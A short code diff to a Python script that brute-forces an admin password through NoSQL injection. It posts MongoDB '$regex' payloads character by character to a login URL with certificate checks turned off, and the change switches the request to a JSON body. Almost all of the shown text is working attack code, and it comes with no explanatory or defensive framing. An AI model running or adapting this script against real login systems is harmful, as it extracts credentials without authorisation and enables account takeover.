@@ -63,12 +63,13 @@ urllib3.disable_warnings()
 username="admin"
 password=""
 u="http://example.org/login"
+headers={'content-type': 'application/json'}
 
 while True:
     for c in string.printable:
         if c not in ['*','+','.','?','|']:
             payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
-            r = requests.post(u, data = {'ids': payload}, verify = False)
+            r = requests.post(u, data = payload, headers = headers, verify = False)
             if 'OK' in r.text:
                 print("Found one more char : %s" % (password+c))
                 password += c
